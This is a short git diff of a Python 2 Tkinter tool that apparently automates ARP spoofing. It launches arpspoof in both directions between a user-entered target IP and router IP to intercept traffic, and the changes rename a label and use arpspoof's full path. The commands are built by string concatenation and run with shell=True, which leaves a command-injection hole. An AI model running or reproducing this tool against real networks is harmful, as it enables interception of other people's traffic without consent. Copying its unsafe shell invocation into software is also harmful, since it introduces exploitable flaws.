@@ -15,7 +15,7 @@ scrapperOutLabel = tk.Label(root, text="Enter Server Directory")
 
 spoofLabel = tk.Label(root, text="--------- ArpSpoof Setup ---------")
 spoofTargetLabel = tk.Label(root, text="Enter ArpSpoof Target's IP Address")
-spoofHostLabel = tk.Label(root, text="Enter ArpSpoof Host's IP Address")
+spoofHostLabel = tk.Label(root, text="Enter ArpSpoof Routers's IP Address")
 
 tk.Label(root, text="").grid(column=0, row=0, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
 
@@ -131,11 +131,11 @@ def accept_inputs():
         print p.communicate(), "\n"
 
         if route_status == 0:
-            cmd = "arpspoof -t " + spoofHost + " " + spoofTarget + " &"
+            cmd = "/usr/sbin/arpspoof -t " + spoofHost + " " + spoofTarget + " &"
             subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             print cmd
 
-            cmd = "arpspoof -t " + spoofTarget + " " + spoofHost + " &"
+            cmd = "/usr/sbin/arpspoof -t " + spoofTarget + " " + spoofHost + " &"
             subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             print cmd
 
